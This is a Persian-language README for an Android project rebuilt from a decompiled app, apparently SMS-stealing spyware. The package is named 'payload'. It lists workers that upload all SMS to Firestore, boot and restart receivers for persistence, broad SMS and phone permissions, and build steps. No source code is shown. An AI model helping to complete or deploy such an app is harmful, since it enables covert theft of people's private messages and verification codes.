# Android SMS Manager App

این پروژه یک اپلیکیشن اندروید است که از روی فایل‌های decompile شده بازسازی شده است.

## ویژگی‌ها

- **مدیریت SMS**: دریافت، ارسال و آپلود پیامک‌ها
- **Firebase Integration**: استفاده از Firestore برای ذخیره‌سازی داده‌ها
- **Background Service**: سرویس پس‌زمینه برای نظارت مداوم
- **WorkManager**: مدیریت کارهای پس‌زمینه
- **Jetpack Compose**: رابط کاربری مدرن

## ساختار پروژه

```
app/src/main/java/com/payload/jansiix0ne/
├── models/              # مدل‌های داده
│   ├── DeviceModel.kt
│   ├── SmsModel.kt
│   ├── UserModel.kt
│   └── ...
├── services/            # سرویس‌های پس‌زمینه
│   ├── UnifiedService.kt
│   └── MyFirebaseMessagingService.kt
├── broadcast/           # BroadcastReceivers
│   ├── Receiver.kt
│   ├── BootReceiver.kt
│   └── RestartServiceReceiver.kt
├── worker/              # WorkManager Workers
│   ├── SmsUploadWorker.kt
│   ├── RegisterUserWorker.kt
│   └── AllSmsUploadWorker.kt
├── utils/               # کلاس‌های کمکی
│   └── DeviceUtils.kt
├── MainActivity.kt      # Activity اصلی
└── MainApplication.kt   # Application کلاس
```

## نیازمندی‌ها

- Android Studio Hedgehog یا بالاتر
- Kotlin 2.1.0
- Gradle 8.13.2
- Android SDK 36
- Min SDK 28

## نصب و راه‌اندازی

1. فایل `google-services.json` را در پوشه `app/` قرار دهید
2. پروژه را در Android Studio باز کنید
3. Gradle Sync را اجرا کنید
4. پروژه را Build کنید

## Permissions

این اپلیکیشن به مجوزهای زیر نیاز دارد:

- `READ_SMS` - خواندن پیامک‌ها
- `SEND_SMS` - ارسال پیامک
- `RECEIVE_SMS` - دریافت پیامک
- `READ_PHONE_STATE` - خواندن وضعیت تلفن
- `READ_PHONE_NUMBERS` - خواندن شماره تلفن
- `CALL_PHONE` - برقراری تماس
- `POST_NOTIFICATIONS` - نمایش نوتیفیکیشن (Android 13+)
- `FOREGROUND_SERVICE` - اجرای سرویس پیش‌زمینه
- `INTERNET` - دسترسی به اینترنت

## Firebase Configuration

برای استفاده از Firebase:

1. یک پروژه Firebase ایجاد کنید
2. اپلیکیشن اندروید را به پروژه اضافه کنید
3. فایل `google-services.json` را دانلود کنید
4. Firestore و Firebase Messaging را فعال کنید

## Build

برای ساخت APK:

```bash
./gradlew assembleRelease
```

برای ساخت Bundle:

```bash
./gradlew bundleRelease
```

## توجه

این پروژه از روی فایل‌های decompile شده بازسازی شده و ممکن است برخی قسمت‌ها نیاز به تکمیل داشته باشند.

## License

این پروژه صرفاً برای مقاصد آموزشی بازسازی شده است.
